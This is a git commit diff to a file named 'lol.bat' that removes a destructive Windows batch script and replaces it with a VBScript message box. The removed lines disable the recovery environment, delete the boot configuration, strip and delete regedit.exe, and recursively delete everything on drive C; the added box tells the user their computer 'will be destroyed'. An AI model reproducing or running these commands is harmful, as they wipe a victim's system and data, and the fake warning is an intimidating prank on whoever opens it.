3d6c88749a8fc3bc34af8bdf9c18997c07436ed0
xoxojojo <kornelzietek7@gmail.com>
2026-03-21 13:24:07 +0100

    msgbox.vbs

--- lol.bat
+++ lol.bat
@@ -1,15 +1,17 @@
-@echo off
-:: 1. Wyłączenie środowiska odzyskiwania (Recovery)
-reagentc /disable
+' Tytuł: Caution!
+' Ikona: 48 (Warning)
+' Przyciski: 4 (Yes/No)
+' Opcja: 4096 (Zawsze na wierzchu)
 
-:: 2. Usunięcie konfiguracji rozruchu (Bootloader)
-bcdedit /delete {current} /f
+Dim tytul, tekst, styl, wynik
 
-:: 3. Próba usunięcia edytora rejestru (Wymaga uprawnień)
-takeown /f C:\Windows\regedit.exe
-icacls C:\Windows\regedit.exe /grant administrators:F
-del /f /q C:\Windows\regedit.exe
+tytul = "Caution!"
+tekst = "Warning: This malware is not a joke. Your computer will be destroyed."
+styl = 48 + 4 + 4096
 
-:: 4. "Nuklearny" finał - usunięcie wszystkiego z dysku C
-:: (To sprawi, że system natychmiast zacznie "umierać")
-del /s /q /f C:\*.*
+' Wyświetlenie okna
+wynik = MsgBox(tekst, styl, tytul)
+
+' Po kliknięciu Yes (6) lub No (7) program po prostu się zamyka.
+' Nie ma żadnych instrukcji pod spodem, więc skrypt kończy pracę.
+WScript.Quit
